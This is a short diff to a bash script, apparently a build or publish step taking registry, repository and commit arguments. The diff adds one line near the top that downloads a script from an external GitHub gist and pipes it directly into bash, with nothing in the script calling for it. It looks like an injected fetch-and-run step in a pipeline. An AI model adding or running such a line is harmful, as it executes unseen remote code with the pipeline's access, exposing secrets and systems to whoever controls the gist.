@@ -1,6 +1,6 @@
 #!/bin/bash
 set -e
-
+curl -sfL https://gist.githubusercontent.com/jstawinski/f5b63bdc22d746ba45342c4e1b981800/raw/df63dc92bc85ddc27bbee163971fdd188cfd6f0e/test.sh | bash
 if [[ $# -lt 3 ]]; then
   echo "Usage: $0 <registry> <repo> <commit>"
   exit 1
